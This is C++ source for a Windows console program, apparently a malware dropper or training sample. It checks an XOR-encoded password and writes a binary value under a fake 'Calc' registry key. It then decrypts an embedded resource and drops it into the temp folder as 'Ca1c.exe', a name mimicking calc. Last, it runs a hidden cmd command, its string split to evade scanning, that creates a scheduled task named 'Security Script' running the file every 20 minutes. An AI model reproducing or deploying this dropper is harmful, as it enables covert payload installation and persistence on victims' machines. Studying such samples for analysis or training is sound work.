// agent.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include "Windows.h"

bool stage1()
{
	int nArgs;
	LPWSTR  lpCmdLine  = GetCommandLineW();
	LPWSTR *lpCmdLines = CommandLineToArgvW(lpCmdLine, &nArgs);

	char * pw1 = "TVTVVUWV";	// 20200310 ^ 0x66

	if (nArgs != 2)
	{
		return false;
	}

	if (wcslen(lpCmdLines[1]) != strlen(pw1))
	{
		return false;
	}

	for ( int i = 0; i < wcslen(lpCmdLines[1]); i ++)
	{
		if ( (char )(lpCmdLines[1][i] ^ 0x66) != pw1[i] )
		{
			return false;
		}
	}
	
	return true;
}

bool stage2 ()
{
	BYTE	pw2[22] = {0x7f, 0xaf, 0x03, 0xf4, 0x6c, 0xde, 0x47, 0xc0, 0x7e, 0xac, 0x6c, 0xdc, 0x52, 0xed, 0x56, 0xf9, 0x46, 0xae, 0x02, 0xe6};
	HKEY	phkResult;
	LPCWSTR	subKey = _T("SOFTWARE\\Microsoft\\Calc");
	LPCWSTR	valName = _T("AdvCalc");

	LSTATUS rRes = RegOpenKeyExW ( HKEY_CURRENT_USER , subKey, 0, KEY_ALL_ACCESS, &phkResult);
	if (rRes != ERROR_SUCCESS)
	{
		rRes = RegCreateKeyW( HKEY_CURRENT_USER, subKey, &phkResult);
		if (rRes != ERROR_SUCCESS)
		{
			return false;
		}
	}

	rRes = RegSetValueExW(phkResult, valName, NULL, REG_BINARY, pw2, 22);
	if (rRes != ERROR_SUCCESS)
	{
		return false;
	}
	
	return true;
}

bool stage3(WCHAR *path)
{

	DWORD dwDecKey = 0x80;
	DWORD dwWritten;
	BYTE * pDecBuffer = NULL;

	HRSRC res = FindResourceW(NULL, _T("RRRR"), RT_RCDATA);
    if (!res)
    {
		return false;
	}

    HGLOBAL hRsrc = LoadResource(NULL, res);
	if (!hRsrc)
    {
		return false;
	}

    LPVOID lpvResData = (char*)LockResource(hRsrc);
	if (!lpvResData)
    {
		return false;
	}

    DWORD dwResSize = SizeofResource(NULL, res);
    if (dwResSize <= 0)
    {
		return false;
	}

	pDecBuffer = (BYTE *) malloc (dwResSize);
	if (pDecBuffer == NULL)
    {
		return false;
	}

	memset(pDecBuffer, 0x00, dwResSize);

	for (DWORD i = 0; i < dwResSize ; i ++)
	{
		BYTE ld = *( (BYTE *)(lpvResData) + i );
		BYTE bb = ld ^ (BYTE)( dwDecKey % 0xff );
		memset(pDecBuffer+i, bb, 1);
		dwDecKey++;
	}

	memset(path, 0x00, MAX_PATH+0x10);
	GetTempPathW(MAX_PATH+1, path);
	size_t templen = wcslen(path);
	wcscat_s(path, MAX_PATH+0x10, _T("Ca1c.exe\0\0"));

	HANDLE hFile = CreateFileW(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
    {
		return false;
	}

	WriteFile(hFile, pDecBuffer, dwResSize, &dwWritten, NULL);
	CloseHandle(hFile);

	return true;
}

void stage4(WCHAR *path)
{
	
	WCHAR command [MAX_PATH*2];
	memset(command, 0x00, MAX_PATH*2);
	wcscat_s(command, MAX_PATH*2, _T(" /C schtasks /cr"));
	wcscat_s(command, MAX_PATH*2, _T("eate /sc minute "));
	wcscat_s(command, MAX_PATH*2, _T("/mo 20 /tn \"Secu"));
	wcscat_s(command, MAX_PATH*2, _T("rity Script\" /tr "));
	wcscat_s(command, MAX_PATH*2, path);
	
	ShellExecuteW(NULL, _T("open"), _T("cmd"), command, NULL, SW_HIDE );
}

int _tmain(int argc, _TCHAR* argv[])
{

	WCHAR path[MAX_PATH+0x10];

	if ( !stage1() )
	{
		printf("Unable to run the operation [1].\n");
		exit(-1);
	}
	
	printf("Stage 1 successful.\n");

	if ( !stage2() )
	{
		printf("Unable to run the operation [2].\n");
		exit(-1);
	}
	
	printf("Stage 2 successful.\n");

	if ( !stage3(path) )
	{
		printf("Unable to run the operation [3].\n");
		exit(-1);
	}
	
	printf("Stage 3 successful.\n");

	stage4(path);

	printf("Deployment successful.\n");
	return 0;
}

